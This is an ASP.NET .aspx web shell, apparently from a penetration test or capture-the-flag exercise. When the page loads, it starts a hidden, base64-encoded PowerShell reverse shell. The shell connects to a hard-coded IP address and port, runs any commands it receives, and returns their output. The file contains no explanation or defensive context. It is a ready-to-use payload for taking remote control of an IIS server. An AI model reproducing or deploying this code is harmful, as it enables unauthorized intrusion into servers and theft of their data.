<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    private void Page_Load(object sender, EventArgs e)
    {
        string cmd = "powershell.exe -nop -w hidden -encodedCommand ";
        cmd += Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("$client = New-Object System.Net.Sockets.TCPClient('10.10.77.155',45454);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
        Process.Start("cmd.exe", "/c " + cmd);
    }
</script>
